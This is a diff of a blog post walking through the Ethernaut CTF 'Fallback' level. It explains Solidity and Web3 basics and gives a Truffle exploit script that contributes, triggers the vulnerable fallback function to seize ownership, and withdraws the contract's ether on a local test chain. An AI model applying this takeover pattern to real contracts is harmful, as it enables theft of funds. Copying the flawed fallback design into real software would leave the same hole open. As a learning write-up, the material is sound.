@@ -1,20 +1,20 @@
 Title: Solving Zeppelin's Ethernaut CTF - Fallback
-Date: 2018-05-20 20:30
+Date: 2018-05-31 23:00
 Tags: ethereum, solidity, ctf, smart contracts
 Category: Ethereum
 Slug: solving-zeppelin-ethernaut-ctf-fallback
-Summary: Second post of a series in which we tackle the challenges in the [Ethernaut CTF by Zeppelin](https://ethernaut.zeppelin.solutions/){:target="_blank",:rel="noopener"}. In this article, after explaining the Solidity basics, we solve the first challenge: Fallback.
+Summary: Second post of a series in which we tackle the challenges in the [Ethernaut CTF by Zeppelin](https://ethernaut.zeppelin.solutions/){:target="_blank",:rel="noopener"}. In this article, after explaining the Solidity and Web3 basics by examples, we solve the first challenge: Fallback.
 
 ## Introduction
-In this post, we are going to solve the first challenge in the Ethernaut CTF: **Fallback**. Although, as we will later see, this one is more like an introduction to 
-experimenting with the platform and get comfortable with it than a real challenge. It's a good way to kickstart the CTF, and for us, to start digging into Solidity, Web3, Ethereum, and many other concepts.
+In this post, we are going to solve the first challenge in the Ethernaut CTF: **Fallback**. This challenge is closer to an introduction to 
+experimenting with the platform and get comfortable with it than a real exploiting challenge, I know. Nevertheless, it's a good way to kickstart the CTF, and for us, to start digging into Solidity, Web3, Ethereum, and many other concepts.
 
 First of all, go to [the Fallback page](https://ethernaut.zeppelin.solutions/level/0x234094aac85628444a82dae0396c680974260be7){:target="_blank",:rel="noopener"} and read the challenge, even though you may not understand a thing of what it says at first. At the bottom, there's the Smart Contract code, written in Solidity. Check it out too, don't be lazy. At least try to grasp what the contract is supposed to accomplish by reading the function names.
 
 Ready? Ok, let's break it down.
 
-### Solidity 101
-#### Pragma solidity
+## Solidity 101
+### Pragma solidity
 ~~~solidity
 pragma solidity ^0.4.18;
 ~~~
@@ -23,7 +23,7 @@ You better get used to this line of code, because you will see that A LOT. Like,
 
 In this case the line would mean: 'Hey, compile this Solidity code with **at least** a 0.4.18 compiler, because otherwise, your compiler may not understand some things about the source code'. Another thing to note here: **semicolons**. Yes, they're mandatory.
 
-#### Imports
+### Imports
 ~~~solidity
 /* Fallback.sol */
 
@@ -31,7 +31,7 @@ import 'zeppelin-solidity/contracts/ownership/Ownable.sol';
 ~~~
 Not so much to say about this line for now. It imports an existing contract called `Ownable.sol` to be used later as a base contract for the Fallback contract (contracts can inherit from others).
 
-#### Declaring a ~~class~~ contract
+### Declaring a ~~class~~ contract
 ~~~solidity
 /* Fallback.sol */
 
@@ -41,7 +41,7 @@ If you ever declared a class in some other programming language, this should sou
 
 Our contract, Fallback, inherits the attributes and functions from Ownable. Bear in mind that Solidity supports multiple inheritance, and that **the order in which you write the 'parent' contracts matters** (but that is a whole other story that you should not worry about, at least for now).
 
-#### Ownable
+### Ownable
 But, the fuck is Ownable ?. Well, go and check out the code for yourself at [Zeppelin's repo](https://github.com/OpenZeppelin/openzeppelin-solidity/blob/master/contracts/ownership/Ownable.sol). As the docs say, it main goal is to simplify the tasks related to user authorization. 
 
 Any contract that inherits from Ownable will have an [owner address](https://github.com/OpenZeppelin/openzeppelin-solidity/blob/746673a94f7e43835fcb5cb7b1af8ff1eea4e276/contracts/ownership/Ownable.sol#L10) with the necessary permissions to execute some of the contract's functions, preventing any other account from calling them. Those functions *must* be labeled with the modifier [onlyOwner](https://github.com/OpenZeppelin/openzeppelin-solidity/blob/746673a94f7e43835fcb5cb7b1af8ff1eea4e276/contracts/ownership/Ownable.sol#L31).
@@ -61,7 +61,7 @@ The ownership can be transferred, though, by means of the [transferOwnership](ht
 
 Remember that all of this functions, variables and modifiers are available in the Fallback contract, since it inherits from Ownable.
 
-#### Declaring contract's variables
+### Declaring variables
 ~~~solidity
 /* Fallback.sol */
 
@@ -74,7 +74,7 @@ The keyword [public](http://solidity.readthedocs.io/en/v0.4.21/contracts.html#vi
 
 If interested, you can [learn more about Solidity types here](http://solidity.readthedocs.io/en/v0.4.21/types.html#types)
 
-#### Constructors
+### Constructors
 ~~~solidity
 /* Fallback.sol */
 
@@ -90,7 +90,7 @@ In object-oriented programming world, a class' constructor is called when an ins
 
 In the Ethereum and Solidity world, a contract's constructor is called when the contract is deployed to the network. That means that the constructor is called just **once**. In Fallback's case, by looking at its constructor function, it can be seen that an initial contribution of 1000 ETH from the owner is stored in the `contributions` mapping when the contract is deployed. The keyword `msg.sender` references the caller of the function - *which may or may not be the same as the EOA that originated the transaction (definitely not going down this rabbithole now)*. To keep things simple, let's take for granted that the contract was deployed by an EOA, so `msg.sender` references the address of that particular account.
 
-#### Functions
+### Functions
 ~~~solidity
 /* Fallback.sol */
 
@@ -145,7 +145,7 @@ function() payable public {
 
 Weird, right?. Welcome to Solidity's **fallback functions** world.
 
-#### The fallback function
+### The fallback function
 
 That is how this nameless payable functions are called in Solidity: fallback functions. Why fallback ? Well, because it is the contract's function the EVM will trigger when a transaction that does not include a function call is executed agains a contract. Let's try to make this clearer (Ethereum nazis please do not read the following paragraphs, you may not like them - at all).
 
@@ -159,7 +159,7 @@ Now, what if we just want to send the contract some ether just like we do with a
 
 Okey, back to Fallback's (the contract) fallback function. In it, we discover the easier way we were looking for to become the owners of the contract!. Anyone who has previously made a contribution and calls the function fallback afterwards (sending some aditional ethers), automatically becomes the new owner, therefore passing the challenge. At this point, I imagine you're as fed up with this whole Solidity theory as I am, so let's do it!.
 
-### Deploying Fallback
+## Deploying your first smart contract
 After studying the whole Fallback contract code, we found a way to become the owners. Now, how do we do actually do it?.
 
 Although the Zeppelin's guys provide us with an already set up interactive in-browser platform, I found it far more enriching to the learning process to set up my own local test environment using the tools we saw in the [first article](https://www.hackingmood.com/ethereum/solving-zeppelin-ethernaut-ctf-intro/). So that is what we are going to do.
@@ -199,11 +199,11 @@ Note that the message even includes the contract's address - 0x53ae8970e687a2c62
 
 Now that the contract has been deployed, it is time to start interacting with it.
 
-### Enter Web3
+## Enter Web3
 
 Remeber how in the [introductory article](https://www.hackingmood.com/ethereum/solving-zeppelin-ethernaut-ctf-intro#summing-up) we launched the interactive development console of Truffle which let us 'talk' to our local blockchain ? You better forget about that useless piece of crap.
 
-Just kidding (: - but we won't be using it for now. Instead, we will be using Truffle's `exec` command to launch our own external scripts to exploit the contracts vulnerabilities. These scripts will be written in Javascript, using the de-facto standard [Web3 API](https://github.com/ethereum/web3.js/), which is already provided by Truffle as a global variable in our scripts as long as we launch them with `truffle exec <my-badass-script.js>` (so no need to `npm install` nor `require` anything, cool).
+Just kidding (: - but we won't be using it for now. Instead, we will be using Truffle's `exec` command to launch our own external scripts to exploit the contracts vulnerabilities. These scripts will be written in JavaScript, using the de-facto standard [Web3 API](https://github.com/ethereum/web3.js/), which is already provided by Truffle as a global variable in our scripts as long as we launch them with `truffle exec <my-badass-script.js>` (so no need to `npm install` nor `require` anything, cool).
 
 Create a new folder `exploits` in the root directory of the project and a Javascript file called `fallback.exploit.js` inside the folder. Now, let's write the exploit.
 
@@ -215,7 +215,7 @@ const FallbackContract = artifacts.require('Fallback')
 const assert = require('assert')
 ~~~
 
-According to [Truffle's docs on external scripts](http://truffleframework.com/docs/getting_started/scripts#file-structure), we ought to export a function that takes a callback as an argument. Moreover, that callback needs to be executed at the end of the script, such as:
+According to [Truffle's docs on external scripts](http://truffleframework.com/docs/getting_started/scripts#file-structure), we ought to export a function that takes a callback as an argument. Moreover, that callback needs to be executed at the end of the script, like this:
 
 ~~~ javascript
 /* fallback.exploit.js */
@@ -230,13 +230,15 @@ async function execute(callback) {
 module.exports = execute
 ~~~
 
-I know, nothing fancy yet. This is all Truffle-related stuff, let's call it the *structure* of our exploits. In fact, you'll see that we will always come back to this boilerplate in future tutorials, so keep it at hand. Let's go ahead and do something more interesting. Remember that to solve Fallback, we need to do 3 simple tasks:
+I know, nothing fancy yet. This is all Truffle-related stuff, let's call it the *structure* of our exploits. In fact, you'll see that we will always come back to this boilerplate in future tutorials, so keep it at hand. 
+
+Let's go ahead and do something more interesting. Recall that, to solve Fallback, we need to do 3 simple tasks:
 
 1. Make a contribution minor than 0.001 ether
 2. Call the fallback function to become the owner
 3. Withdraw!
 
-So...
+## Exploiting the contract
 
 ~~~javascript
 /* fallback.exploit.js */
@@ -271,14 +273,14 @@ module.exports = execute
 
 Since, by default, our contracts are deployed using the first account provided by Truffle (`web3.eth.accounts[0]`), we are going to suppose that `web3.eth.accounts[0]` is the *victim* account. Our *attacker* account will be, in most cases, `web3.eth.accounts[1]`.
 
-In the script, once we find the attacker account, we then create an instance of an *already deployed* contract using the `deployed()` method. This instance, named `contract`, can be used to call all public functions defined in the Fallback contract's ABI, including the getters for the public variables. In particular, we are first calling the public getter of the `owner` variable by doing `contract.owner.call()` and after checking that the current owner is the victim address, we make the small contribution to the contract with `contract.contribute(...)`.
+In the script, once we find the attacker account, we then create an instance of an *already deployed* contract using the `deployed()` method. The instance, named `contract`, can be used to call all public functions defined in the Fallback contract's ABI, including the getters for the public variables. In particular, we are first calling the public getter of the `owner` variable by doing `contract.owner.call()` and after checking that the current owner is the victim address, we make the small contribution to the contract with `contract.contribute(...)`.
 
 You might now be wondering why on earth we are passing an object as an argument to `contribute`, when it actually does not take any arguments at all (according to its definition in Fallback.sol). If you are not, well, you should.
 The thing is, Truffle and Web3 do plenty *magic* stuff behind the scenes.
 Thanks to Web3, there are [multiple ways in which you can call contract functions](https://github.com/ethereum/wiki/wiki/JavaScript-API#contract-methods):
-1. `contract.methodName.call()`
-2. `contract.methodName.sendTransaction()`
-3. `contract.methodName()`
+1. `contract.methodName.call(...)`
+2. `contract.methodName.sendTransaction(...)`
+3. `contract.methodName(...)`
 
 For simplicity, I tend to go with version 3 most of the times. The arguments passed to the function should start with those specific to the function (none in `contribute`), followed by a *transaction object* (the object we are passing to `contribute`) and a callback (I'm done with using callbacks, I rather async/await now).
 
@@ -286,6 +288,47 @@ Things to take into account regarding the [transaction object](https://github.co
 - `from` defaults to `web3.eth.accounts[0]` if not explicitly defined
 - `to` is not necessary when calling a contract's function
 - `value` must be in Wei units, that is why we do `value: web3.toWei(...)`
-Although these are the three attributes we will most often use, please remember that the others exist as well and might come in handy sometimes.
+Although these are the three attributes we will most often use, please remember that the others exist as well and might come in handy sometimes. When in doubt, always refer to the docs.
+
+Time to reclaim what is ours! Let's become the owners of Fallback.
+~~~javascript
+/* fallback.exploit.js */
+
+// 2. Call the fallback function to become the owner of the contract
+await contract.sendTransaction({
+    from: attacker,
+    value: web3.toWei(0.00000001, 'ether')
+})
+
+// Check who's the owner now :)
+contractOwner = await contract.owner.call()
+assert.equal(contractOwner, attacker)
+console.log(`Contract owner: ${contractOwner}`)
+~~~
+
+As we earlier saw in Fallback.sol, anyone who calls its fallback function becomes the owner of the contract. Quick reminder:
+~~~solidity
+/* Fallback.sol */
+function() public payable {
+    require(msg.value > 0 && contributions[msg.sender] > 0);
+    owner = msg.sender;
+}
+~~~
+
+As in our exploit we're not calling any specific function, just sending a regular transaction to the contract with `contract.sendTransaction(...)`, the fallback's code is executed and we successfuly accomplish our objective. If the contract had any ether in it, we could now be able to withdraw all of it by simply doing:
+~~~javascript
+/* Fallback.exploit.js */
+
+// 3. Withdraw all money
+let response = await contract.withdraw({
+    from: attacker
+})
+console.log(`Withdrew all money in transaction ${response.tx}`)
+~~~
+
+That's it!  You can now run `truffle exec exploits/fallback.exploit.js` to execute the exploit and pass the challenge.
+
+Find the entire [exploit code of the Fallback contract at my GitHub repo](https://github.com/tinchoabbate/ethernaut-ctf/blob/master/exploits/fallback.exploit.js).
 
 
+If you enjoyed this first challenge, stay tuned! In the next post we will be tackling the next one: [Fallout](https://ethernaut.zeppelin.solutions/level/0x220beee334f1c1f8078352d88bcc4e6165b792f6).
